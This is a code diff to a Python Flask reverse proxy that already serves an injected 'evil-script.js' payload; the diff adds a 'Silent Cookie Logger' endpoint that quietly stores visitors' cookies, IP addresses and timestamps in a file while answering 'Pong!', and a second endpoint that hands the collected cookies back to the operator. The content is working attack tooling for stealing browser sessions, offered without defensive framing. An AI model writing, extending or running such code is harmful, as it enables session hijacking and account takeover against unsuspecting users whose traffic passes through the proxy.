@@ -1,7 +1,11 @@
-from flask import Flask, request, Response, send_from_directory
-import requests
+from flask import Flask, request, Response, send_from_directory, jsonify
+import requests, re, json, os
 import brotli
-import re
+from datetime import datetime
+
+if not os.path.exists('cookies.json'):
+    with open('cookies.json', 'w') as f:
+        json.dump([], f)
 
 def start_proxy(target, host, port, secret):
     app = Flask(__name__)
@@ -18,6 +22,59 @@ def start_proxy(target, host, port, secret):
     def payload():
         return send_from_directory('.', 'evil-script.js')
 
+    # API:
+    @app.route('/ep/api/ping', methods=['POST']) # Silent Cookie Logger
+    def eat_cookie():
+        cookies = request.cookies
+        user_ip = request.remote_addr
+        timestamp = datetime.now().isoformat()
+
+        cookie_data = []
+        for key, value in cookies.items():
+            cookie_data.append({
+                'name': key,
+                'value': value,
+                'timestamp': timestamp,
+                'ip': user_ip
+            })
+
+        with open('cookies.json', 'r') as f:
+            existing_cookies = json.load(f)
+
+        existing_cookies.extend(cookie_data)
+
+        with open('cookies.json', 'w') as f:
+            json.dump(existing_cookies, f)
+
+        return jsonify({'message': 'Pong!'}), 200
+
+    @app.route('/ep/api/getCookies', methods=['GET'])
+    def get_cookies():
+        with open('cookies.json', 'r') as f:
+            cookies = json.load(f)
+
+        response_data = []
+        for cookie in cookies:
+            logged_time = datetime.fromisoformat(cookie['timestamp'])
+            time_diff = datetime.now() - logged_time
+            seconds_ago = time_diff.total_seconds()
+            
+            if seconds_ago < 60:
+                time_str = f'Logged: {int(seconds_ago)} seconds ago'
+            elif seconds_ago < 3600:
+                time_str = f'Logged: {int(seconds_ago // 60)} minutes ago'
+            else:
+                time_str = f'Logged: {int(seconds_ago // 3600)} hours ago'
+
+            response_data.append({
+                'name': cookie['name'],
+                'value': cookie['value'],
+                'timestamp': time_str
+            })
+
+        return jsonify(response_data), 200
+
+    # Main:
     @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
     @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
     def proxy(path):
@@ -60,4 +117,4 @@ def start_proxy(target, host, port, secret):
 
         return Response(resp_content, status=resp.status_code, headers=response_headers)
 
-    app.run(host=host, port=port)
+    app.run(host=host, port=port, threaded=True)
